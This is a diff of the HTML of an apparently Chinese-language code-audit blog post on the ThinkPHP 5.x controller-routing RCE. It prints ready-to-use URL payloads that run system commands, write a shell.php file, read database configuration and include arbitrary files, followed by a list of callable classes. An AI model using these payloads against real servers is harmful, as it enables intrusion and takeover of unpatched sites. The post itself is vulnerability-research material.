@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="漏洞环境漏洞影响版本：5.0.7&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.22  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30 payload随版本调整: 5.1.x ?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd">
+        <meta name="description" content="漏洞环境漏洞影响版本：5.0.7&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.22  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30 payload随版本调整: 5.1.x 12345?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd?s&#x3D;index&#x2F;\think\view\">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ThinkPHP5代码审计:代码执行(二)">
 <meta property="og:url" content="http://example.com/2024/06/12/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%BA%8C/index.html">
 <meta property="og:site_name" content="p0l1st&#39;s blog">
-<meta property="og:description" content="漏洞环境漏洞影响版本：5.0.7&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.22  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30 payload随版本调整: 5.1.x ?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd">
+<meta property="og:description" content="漏洞环境漏洞影响版本：5.0.7&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.22  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30 payload随版本调整: 5.1.x 12345?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd?s&#x3D;index&#x2F;\think\view\">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815491.png">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815109.png">
@@ -320,22 +320,15 @@
             <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本：5.0.7&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.22  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</p>
 <p>payload随版本调整:</p>
 <p>5.1.x</p>
-<pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd
-?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;
-?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;
-?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id
-?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd</span><br><span class="line">?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;</span><br><span class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;</span><br><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure></div>
 
 <p>5.0.x</p>
-<pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息
-?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件
-?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件
-?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\config/get&amp;name=database.username # 获取配置信息</span><br><span class="line">?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件</span><br><span class="line">?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure></div>
 
 
 
 <p>这里我用的是5.1.25</p>
-<pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure></div>
 
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815491.png" alt="image-20240612223655352"></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>本次漏洞存在于ThinkPHP底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致RCE。</p>
@@ -345,7 +338,7 @@
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816109.png" alt="image-20240612214813065"></p>
 <p>这里没有开启强制路由，我们就可以使用路由兼容模式s参数，并且框架对控制器名没有检测，那么就可以调用任意的控制器。</p>
 <p>尝试利用**?s&#x3D;模块&#x2F;控制器&#x2F;方法**来测试一下，在前面分析SQL注入时我们知道所有用户参数都会经过Request类的input方法，而input方法又调用了filterValue方法，filterValue方法使用了call_user_func，那么就可以构造</p>
-<pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Request/input&amp;filter[]=system&amp;data=whoami</span><br></pre></td></tr></table></figure></div>
 
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816422.png" alt="image-20240612220221561"></p>
 <p>可以看到命令执行成功了(注意版本)，那么再去查看官方修改的$controller，可以看到控制器名是从$result获取的，而result的值来自兼容模式下的pathinfo，即s参数</p>
@@ -358,204 +351,12 @@
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816339.png" alt="image-20240612223133249"></p>
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816863.png" alt="image-20240612223215613"></p>
 <p>最后注意5.0.x和5.1.x可利用的类不同</p>
-<pre class="line-numbers language-none"><code class="language-none">ThinkPHP 5.1.x                  ThinkPHP 5.0.x
-stdClass                        stdClass 
-Exception                       Exception 
-ErrorException                  ErrorException 
-Closure                         Closure 
-Generator                       Generator 
-DateTime                        DateTime 
-DateTimeImmutable               DateTimeImmutable 
-DateTimeZone                    DateTimeZone 
-DateInterval                    DateInterval 
-DatePeriod                      DatePeriod 
-LibXMLError                     LibXMLError 
-DOMException                    DOMException 
-DOMStringList                   DOMStringList 
-DOMNameList                     DOMNameList 
-DOMImplementationList           DOMImplementationList 
-DOMImplementationSource         DOMImplementationSource 
-DOMImplementation               DOMImplementation 
-DOMNode                         DOMNode 
-DOMNameSpaceNode                DOMNameSpaceNode 
-DOMDocumentFragment             DOMDocumentFragment 
-DOMDocument                     DOMDocument 
-DOMNodeList                     DOMNodeList 
-DOMNamedNodeMap                 DOMNamedNodeMap 
-DOMCharacterData                DOMCharacterData 
-DOMAttr                         DOMAttr 
-DOMElement                      DOMElement 
-DOMText                         DOMText 
-DOMComment                      DOMComment 
-DOMTypeinfo                     DOMTypeinfo 
-DOMUserDataHandler              DOMUserDataHandler 
-DOMDomError                     DOMDomError 
-DOMErrorHandler                 DOMErrorHandler 
-DOMLocator                      DOMLocator 
-DOMConfiguration                DOMConfiguration 
-DOMCdataSection                 DOMCdataSection 
-DOMDocumentType                 DOMDocumentType 
-DOMNotation                     DOMNotation 
-DOMEntity                       DOMEntity 
-DOMEntityReference              DOMEntityReference 
-DOMProcessingInstruction        DOMProcessingInstruction 
-DOMStringExtend                 DOMStringExtend 
-DOMXPath                        DOMXPath 
-finfo                           finfo 
-LogicException                  LogicException 
-BadFunctionCallException        BadFunctionCallException 
-BadMethodCallException          BadMethodCallException 
-DomainException                 DomainException 
-InvalidArgumentException        InvalidArgumentException 
-LengthException                 LengthException 
-OutOfRangeException             OutOfRangeException 
-RuntimeException                RuntimeException 
-OutOfBoundsException            OutOfBoundsException 
-OverflowException               OverflowException 
-RangeException                  RangeException 
-UnderflowException              UnderflowException 
-UnexpectedValueException        UnexpectedValueException 
-RecursiveIteratorIterator       RecursiveIteratorIterator 
-IteratorIterator                IteratorIterator 
-FilterIterator                  FilterIterator 
-RecursiveFilterIterator         RecursiveFilterIterator 
-CallbackFilterIterator          CallbackFilterIterator 
-RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator 
-ParentIterator                  ParentIterator 
-LimitIterator                   LimitIterator 
-CachingIterator                 CachingIterator 
-RecursiveCachingIterator        RecursiveCachingIterator 
-NoRewindIterator                NoRewindIterator 
-AppendIterator                  AppendIterator 
-InfiniteIterator                InfiniteIterator 
-RegexIterator                   RegexIterator 
-RecursiveRegexIterator          RecursiveRegexIterator 
-EmptyIterator                   EmptyIterator 
-RecursiveTreeIterator           RecursiveTreeIterator 
-ArrayObject                     ArrayObject 
-ArrayIterator                   ArrayIterator 
-RecursiveArrayIterator          RecursiveArrayIterator 
-SplFileInfo                     SplFileInfo 
-DirectoryIterator               DirectoryIterator 
-FilesystemIterator              FilesystemIterator 
-RecursiveDirectoryIterator      RecursiveDirectoryIterator 
-GlobIterator                    GlobIterator 
-SplFileObject                   SplFileObject 
-SplTempFileObject               SplTempFileObject 
-SplDoublyLinkedList             SplDoublyLinkedList 
-SplQueue                        SplQueue 
-SplStack                        SplStack 
-SplHeap                         SplHeap 
-SplMinHeap                      SplMinHeap 
-SplMaxHeap                      SplMaxHeap 
-SplPriorityQueue                SplPriorityQueue 
-SplFixedArray                   SplFixedArray 
-SplObjectStorage                SplObjectStorage 
-MultipleIterator                MultipleIterator 
-SessionHandler                  SessionHandler 
-ReflectionException             ReflectionException 
-Reflection                      Reflection 
-ReflectionFunctionAbstract      ReflectionFunctionAbstract 
-ReflectionFunction              ReflectionFunction 
-ReflectionParameter             ReflectionParameter 
-ReflectionMethod                ReflectionMethod 
-ReflectionClass                 ReflectionClass 
-ReflectionObject                ReflectionObject 
-ReflectionProperty              ReflectionProperty 
-ReflectionExtension             ReflectionExtension 
-ReflectionZendExtension         ReflectionZendExtension 
-__PHP_Incomplete_Class          __PHP_Incomplete_Class 
-php_user_filter                 php_user_filter 
-Directory                       Directory 
-SimpleXMLElement                SimpleXMLElement 
-SimpleXMLIterator               SimpleXMLIterator 
-SoapClient                      SoapClient 
-SoapVar                         SoapVar 
-SoapServer                      SoapServer 
-SoapFault                       SoapFault 
-SoapParam                       SoapParam 
-SoapHeader                      SoapHeader 
-PharException                   PharException 
-Phar                            Phar 
-PharData                        PharData 
-PharFileInfo                    PharFileInfo 
-XMLReader                       XMLReader 
-XMLWriter                       XMLWriter 
-ZipArchive                      ZipArchive 
-PDOException                    PDOException 
-PDO                             PDO 
-PDOStatement                    PDOStatement 
-PDORow                          PDORow 
-CURLFile                        CURLFile 
-Collator                        Collator 
-NumberFormatter                 NumberFormatter 
-Normalizer                      Normalizer 
-Locale                          Locale 
-MessageFormatter                MessageFormatter 
-IntlDateFormatter               IntlDateFormatter 
-ResourceBundle                  ResourceBundle 
-Transliterator                  Transliterator 
-IntlTimeZone                    IntlTimeZone 
-IntlCalendar                    IntlCalendar 
-IntlGregorianCalendar           IntlGregorianCalendar 
-Spoofchecker                    Spoofchecker 
-IntlException                   IntlException 
-IntlIterator                    IntlIterator 
-IntlBreakIterator               IntlBreakIterator 
-IntlRuleBasedBreakIterator      IntlRuleBasedBreakIterator 
-IntlCodePointBreakIterator      IntlCodePointBreakIterator 
-IntlPartsIterator               IntlPartsIterator 
-UConverter                      UConverter 
-JsonIncrementalParser           JsonIncrementalParser 
-mysqli_sql_exception            mysqli_sql_exception 
-mysqli_driver                   mysqli_driver 
-mysqli                          mysqli 
-mysqli_warning                  mysqli_warning 
-mysqli_result                   mysqli_result 
-mysqli_stmt                     mysqli_stmt 
-Composer\Autoload\ComposerStaticInit81a0c33d33d83a86fdd976e2aff753d9            Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c 
-think\Loader                    think\Loader
-think\Error                     think\Error 
-think\Container                 think\Config 
-think\App                       think\App 
-think\Env                       think\Request 
-think\Config                    think\Hook 
-think\Hook                      think\Env 
-think\Facade                    think\Lang 
-think\facade\Env                think\Log 
-env                             think\Route
-think\Db 
-think\Lang 
-think\Request 
-think\facade\Route 
-route 
-think\Route 
-think\route\Rule 
-think\route\RuleGroup 
-think\route\Domain 
-think\route\RuleItem 
-think\route\RuleName 
-think\route\Dispatch 
-think\route\dispatch\Url 
-think\route\dispatch\Module 
-think\Middleware 
-think\Cookie 
-think\View 
-think\view\driver\Think 
-think\Template 
-think\template\driver\File 
-think\Log 
-think\log\driver\File 
-think\Session 
-think\Debug 
-think\Cache 
-think\cache\Driver 
-think\cache\driver\File <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP 5.1.x                  ThinkPHP 5.0.x</span><br><span class="line">stdClass                        stdClass </span><br><span class="line">Exception                       Exception </span><br><span class="line">ErrorException                  ErrorException </span><br><span class="line">Closure                         Closure </span><br><span class="line">Generator                       Generator </span><br><span class="line">DateTime                        DateTime </span><br><span class="line">DateTimeImmutable               DateTimeImmutable </span><br><span class="line">DateTimeZone                    DateTimeZone </span><br><span class="line">DateInterval                    DateInterval </span><br><span class="line">DatePeriod                      DatePeriod </span><br><span class="line">LibXMLError                     LibXMLError </span><br><span class="line">DOMException                    DOMException </span><br><span class="line">DOMStringList                   DOMStringList </span><br><span class="line">DOMNameList                     DOMNameList </span><br><span class="line">DOMImplementationList           DOMImplementationList </span><br><span class="line">DOMImplementationSource         DOMImplementationSource </span><br><span class="line">DOMImplementation               DOMImplementation </span><br><span class="line">DOMNode                         DOMNode </span><br><span class="line">DOMNameSpaceNode                DOMNameSpaceNode </span><br><span class="line">DOMDocumentFragment             DOMDocumentFragment </span><br><span class="line">DOMDocument                     DOMDocument </span><br><span class="line">DOMNodeList                     DOMNodeList </span><br><span class="line">DOMNamedNodeMap                 DOMNamedNodeMap </span><br><span class="line">DOMCharacterData                DOMCharacterData </span><br><span class="line">DOMAttr                         DOMAttr </span><br><span class="line">DOMElement                      DOMElement </span><br><span class="line">DOMText                         DOMText </span><br><span class="line">DOMComment                      DOMComment </span><br><span class="line">DOMTypeinfo                     DOMTypeinfo </span><br><span class="line">DOMUserDataHandler              DOMUserDataHandler </span><br><span class="line">DOMDomError                     DOMDomError </span><br><span class="line">DOMErrorHandler                 DOMErrorHandler </span><br><span class="line">DOMLocator                      DOMLocator </span><br><span class="line">DOMConfiguration                DOMConfiguration </span><br><span class="line">DOMCdataSection                 DOMCdataSection </span><br><span class="line">DOMDocumentType                 DOMDocumentType </span><br><span class="line">DOMNotation                     DOMNotation </span><br><span class="line">DOMEntity                       DOMEntity </span><br><span class="line">DOMEntityReference              DOMEntityReference </span><br><span class="line">DOMProcessingInstruction        DOMProcessingInstruction </span><br><span class="line">DOMStringExtend                 DOMStringExtend </span><br><span class="line">DOMXPath                        DOMXPath </span><br><span class="line">finfo                           finfo </span><br><span class="line">LogicException                  LogicException </span><br><span class="line">BadFunctionCallException        BadFunctionCallException </span><br><span class="line">BadMethodCallException          BadMethodCallException </span><br><span class="line">DomainException                 DomainException </span><br><span class="line">InvalidArgumentException        InvalidArgumentException </span><br><span class="line">LengthException                 LengthException </span><br><span class="line">OutOfRangeException             OutOfRangeException </span><br><span class="line">RuntimeException                RuntimeException </span><br><span class="line">OutOfBoundsException            OutOfBoundsException </span><br><span class="line">OverflowException               OverflowException </span><br><span class="line">RangeException                  RangeException </span><br><span class="line">UnderflowException              UnderflowException </span><br><span class="line">UnexpectedValueException        UnexpectedValueException </span><br><span class="line">RecursiveIteratorIterator       RecursiveIteratorIterator </span><br><span class="line">IteratorIterator                IteratorIterator </span><br><span class="line">FilterIterator                  FilterIterator </span><br><span class="line">RecursiveFilterIterator         RecursiveFilterIterator </span><br><span class="line">CallbackFilterIterator          CallbackFilterIterator </span><br><span class="line">RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator </span><br><span class="line">ParentIterator                  ParentIterator </span><br><span class="line">LimitIterator                   LimitIterator </span><br><span class="line">CachingIterator                 CachingIterator </span><br><span class="line">RecursiveCachingIterator        RecursiveCachingIterator </span><br><span class="line">NoRewindIterator                NoRewindIterator </span><br><span class="line">AppendIterator                  AppendIterator </span><br><span class="line">InfiniteIterator                InfiniteIterator </span><br><span class="line">RegexIterator                   RegexIterator </span><br><span class="line">RecursiveRegexIterator          RecursiveRegexIterator </span><br><span class="line">EmptyIterator                   EmptyIterator </span><br><span class="line">RecursiveTreeIterator           RecursiveTreeIterator </span><br><span class="line">ArrayObject                     ArrayObject </span><br><span class="line">ArrayIterator                   ArrayIterator </span><br><span class="line">RecursiveArrayIterator          RecursiveArrayIterator </span><br><span class="line">SplFileInfo                     SplFileInfo </span><br><span class="line">DirectoryIterator               DirectoryIterator </span><br><span class="line">FilesystemIterator              FilesystemIterator </span><br><span class="line">RecursiveDirectoryIterator      RecursiveDirectoryIterator </span><br><span class="line">GlobIterator                    GlobIterator </span><br><span class="line">SplFileObject                   SplFileObject </span><br><span class="line">SplTempFileObject               SplTempFileObject </span><br><span class="line">SplDoublyLinkedList             SplDoublyLinkedList </span><br><span class="line">SplQueue                        SplQueue </span><br><span class="line">SplStack                        SplStack </span><br><span class="line">SplHeap                         SplHeap </span><br><span class="line">SplMinHeap                      SplMinHeap </span><br><span class="line">SplMaxHeap                      SplMaxHeap </span><br><span class="line">SplPriorityQueue                SplPriorityQueue </span><br><span class="line">SplFixedArray                   SplFixedArray </span><br><span class="line">SplObjectStorage                SplObjectStorage </span><br><span class="line">MultipleIterator                MultipleIterator </span><br><span class="line">SessionHandler                  SessionHandler </span><br><span class="line">ReflectionException             ReflectionException </span><br><span class="line">Reflection                      Reflection </span><br><span class="line">ReflectionFunctionAbstract      ReflectionFunctionAbstract </span><br><span class="line">ReflectionFunction              ReflectionFunction </span><br><span class="line">ReflectionParameter             ReflectionParameter </span><br><span class="line">ReflectionMethod                ReflectionMethod </span><br><span class="line">ReflectionClass                 ReflectionClass </span><br><span class="line">ReflectionObject                ReflectionObject </span><br><span class="line">ReflectionProperty              ReflectionProperty </span><br><span class="line">ReflectionExtension             ReflectionExtension </span><br><span class="line">ReflectionZendExtension         ReflectionZendExtension </span><br><span class="line">__PHP_Incomplete_Class          __PHP_Incomplete_Class </span><br><span class="line">php_user_filter                 php_user_filter </span><br><span class="line">Directory                       Directory </span><br><span class="line">SimpleXMLElement                SimpleXMLElement </span><br><span class="line">SimpleXMLIterator               SimpleXMLIterator </span><br><span class="line">SoapClient                      SoapClient </span><br><span class="line">SoapVar                         SoapVar </span><br><span class="line">SoapServer                      SoapServer </span><br><span class="line">SoapFault                       SoapFault </span><br><span class="line">SoapParam                       SoapParam </span><br><span class="line">SoapHeader                      SoapHeader </span><br><span class="line">PharException                   PharException </span><br><span class="line">Phar                            Phar </span><br><span class="line">PharData                        PharData </span><br><span class="line">PharFileInfo                    PharFileInfo </span><br><span class="line">XMLReader                       XMLReader </span><br><span class="line">XMLWriter                       XMLWriter </span><br><span class="line">ZipArchive                      ZipArchive </span><br><span class="line">PDOException                    PDOException </span><br><span class="line">PDO                             PDO </span><br><span class="line">PDOStatement                    PDOStatement </span><br><span class="line">PDORow                          PDORow </span><br><span class="line">CURLFile                        CURLFile </span><br><span class="line">Collator                        Collator </span><br><span class="line">NumberFormatter                 NumberFormatter </span><br><span class="line">Normalizer                      Normalizer </span><br><span class="line">Locale                          Locale </span><br><span class="line">MessageFormatter                MessageFormatter </span><br><span class="line">IntlDateFormatter               IntlDateFormatter </span><br><span class="line">ResourceBundle                  ResourceBundle </span><br><span class="line">Transliterator                  Transliterator </span><br><span class="line">IntlTimeZone                    IntlTimeZone </span><br><span class="line">IntlCalendar                    IntlCalendar </span><br><span class="line">IntlGregorianCalendar           IntlGregorianCalendar </span><br><span class="line">Spoofchecker                    Spoofchecker </span><br><span class="line">IntlException                   IntlException </span><br><span class="line">IntlIterator                    IntlIterator </span><br><span class="line">IntlBreakIterator               IntlBreakIterator </span><br><span class="line">IntlRuleBasedBreakIterator      IntlRuleBasedBreakIterator </span><br><span class="line">IntlCodePointBreakIterator      IntlCodePointBreakIterator </span><br><span class="line">IntlPartsIterator               IntlPartsIterator </span><br><span class="line">UConverter                      UConverter </span><br><span class="line">JsonIncrementalParser           JsonIncrementalParser </span><br><span class="line">mysqli_sql_exception            mysqli_sql_exception </span><br><span class="line">mysqli_driver                   mysqli_driver </span><br><span class="line">mysqli                          mysqli </span><br><span class="line">mysqli_warning                  mysqli_warning </span><br><span class="line">mysqli_result                   mysqli_result </span><br><span class="line">mysqli_stmt                     mysqli_stmt </span><br><span class="line">Composer\Autoload\ComposerStaticInit81a0c33d33d83a86fdd976e2aff753d9            Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c </span><br><span class="line">think\Loader                    think\Loader</span><br><span class="line">think\Error                     think\Error </span><br><span class="line">think\Container                 think\Config </span><br><span class="line">think\App                       think\App </span><br><span class="line">think\Env                       think\Request </span><br><span class="line">think\Config                    think\Hook </span><br><span class="line">think\Hook                      think\Env </span><br><span class="line">think\Facade                    think\Lang </span><br><span class="line">think\facade\Env                think\Log </span><br><span class="line">env                             think\Route</span><br><span class="line">think\Db </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\facade\Route </span><br><span class="line">route 